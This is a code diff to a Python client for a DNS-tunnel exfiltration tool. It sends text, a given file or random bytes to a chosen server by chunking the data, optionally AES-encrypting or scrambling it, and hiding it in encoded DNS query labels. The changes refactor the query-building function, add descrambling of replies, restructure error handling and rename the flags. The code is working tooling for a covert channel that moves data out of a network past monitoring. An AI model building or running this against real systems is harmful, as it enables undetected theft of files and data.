@@ -33,6 +33,7 @@ class Client():
 
             self.tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.tcp_sock.settimeout(self.timeout)
+            self.tcp_sock.setblocking(True)
             self.tcp_sock.connect(self.addr)
 
         except Exception:
@@ -42,8 +43,8 @@ class Client():
             sys.exit(1)
 
     def run(self):
-        try:   
-            while True:
+        while True:
+            try:
                 if (self.modes[0]):
                     data = self.read_text()
                 elif (self.modes[1]):
@@ -55,11 +56,11 @@ class Client():
                 old_hash = hashlib.sha1(data).digest()
 
                 if (type(self.key) == list):
-                    queries = self.dns_ask(data, exf.scramble, self.key)
+                    queries = self.dns_ask(data, base64.urlsafe_b64encode, exf.scramble, self.key)
                 elif (type(self.key) == str):
-                    queries = self.dns_ask(data, exf.aes_encrypt, self.key)
+                    queries = self.dns_ask(data, base64.urlsafe_b64encode, exf.aes_encrypt, self.key)
                 else:
-                    queries = self.dns_ask(data, None)
+                    queries = self.dns_ask(data, base64.urlsafe_b64encode, None)
                 
                 answers = []
                 for q in queries:
@@ -85,17 +86,21 @@ class Client():
                     print("File downloaded.txt is saved!")
                     break
                 
-        except KeyboardInterrupt:
-            print("[Interrupt] Exit by the user...")
-        except Exception as error:
-            print("[Info]", str(error))
-        except socket.error as error:
-            print("[Socket]", str(error))
-        except socket.timeout:
-            print("[Info]", "Server response timed out! Exiting...")
-        finally:
-            self.tcp_sock.close()
-            self.udp_sock.close()
+            except (KeyboardInterrupt, SystemExit):
+                print("[Interrupt] Exit by the user...")
+                break
+            except Exception as error:
+                print("[Info]", str(error))
+                break
+            except socket.error as error:
+                print("[Socket]", str(error))
+                break
+            except socket.timeout:
+                print("[Info]", "Server response timed out! Exiting...")
+                break
+        
+        self.tcp_sock.close()
+        self.udp_sock.close()
 
     def send_recv(self, sock, data=None):
         if (sock is self.udp_sock):
@@ -134,19 +139,26 @@ class Client():
 
         return whole
 
-    def dns_ask(self, data, encrypt, *args):
-        enc_data = exf.domain_encode(data, self.domain,
-                                     base64.urlsafe_b64encode, encrypt, *args)
+    def dns_ask(self, big_data, base_enc, encrypt=None, *args):
+        if encrypt is exf.aes_encrypt:
+            data = exf.chunk(big_data, exf.MAX_ENC_DATA_LEN)
+        else:
+            data = exf.chunk(big_data, exf.MAX_RAW_DATA_LEN)
+
+        if encrypt:
+            data = [encrypt(i, *args) for i in data]
 
         if (args[0]):
-            key = args[0].encode() if isinstance(args[0], str) else bytearray(args[0])
-            enc_key = exf.domain_encode(key, self.domain, 
-                                        base64.urlsafe_b64encode, exf.scramble, (4, 12))
+            enc_key = args[0].encode() if isinstance(args[0], str) else bytearray(args[0])
+            enc_key = exf.scramble(enc_key, (4, 12))
+            enc_key = exf.domain_encode(enc_key, self.domain, base_enc)
+
+        labels = [exf.domain_encode(i, self.domain, base_enc) for i in data]
         
         queries = []
-        for i in enc_data:
+        for i in labels:
             d = dns.DNSRecord.question(i, self.qtype)
-            d.add_question(dns.DNSQuestion(enc_key[0], dns.QTYPE.TXT))
+            d.add_question(dns.DNSQuestion(enc_key, dns.QTYPE.TXT))
             queries += [d.pack()]
         
         return queries
@@ -164,6 +176,8 @@ class Client():
                     result += rd.rdata.data[0]
                 else:
                     result += exf.domain_decode(str(rd.rdata.label), base64.urlsafe_b64decode)
+        
+        result = exf.scramble(result, (3, 11), True)
         return result
 
 # --------------------------------------------------------------------------------------------------
@@ -178,13 +192,13 @@ if __name__ == "__main__":
     parser.add_argument('-t', '--timeout', dest='timeout', type=int, default=60,
                         help="Specifies the timeout for server UDP response")
     
-    parser.add_argument('-st', '--send-text', dest='text', action='store_true',
+    parser.add_argument('-T', '--send-text', dest='text', action='store_true',
                         help='Sends a text string to the server')
     
-    parser.add_argument('-sf', '--send-file', dest='file', type=str,
+    parser.add_argument('-F', '--send-file', dest='file', type=str,
                         help='Sends the file to the server. The file path is required.')
     
-    parser.add_argument('-sr', '--send-random', dest='rand', action='store_true',
+    parser.add_argument('-R', '--send-random', dest='rand', action='store_true',
                         help='Sends a random byte array to the server')
     
     parser.add_argument('-d', '--domain', dest='domain', type=str, default='example.com',
@@ -201,7 +215,7 @@ if __name__ == "__main__":
                         help='Encrypts with AES outgoing traffic passing through the DNS tunnel.\n'+
                             'You need to specify an encryption key')
 
-    parser.add_argument('-tcp', '--tcp', dest='force_tcp', action='store_true',
+    parser.add_argument('-S', '--tcp', dest='force_tcp', action='store_true',
                         help='Forcibly sends DNS messages over TCP connection') 
 
     args = parser.parse_args()
@@ -224,11 +238,13 @@ if __name__ == "__main__":
             parser.error('AES key is less than 3 characters long!')
 
     if (args.text):
-        print("[Mode]", f"Sending text messages ...")
+        print("[Mode]", f"Sending text")
     elif (args.file):
-        print("[Mode]", f"Sending {args.file} ...")
+        print("[Mode]", f"Sending {args.file}")
     elif (args.rand):
-        print("[Mode]", f"Sending random bytes ...")
+        print("[Mode]", f"Sending random bytes")
+    print('[Record Type]', f"{dns.QTYPE.get(args.qtype)}")
+    print("[Server Address]", f"{args.conn}")
 
     addr = args.conn.split(':')
     client = Client((addr[0], int(addr[1])), args)
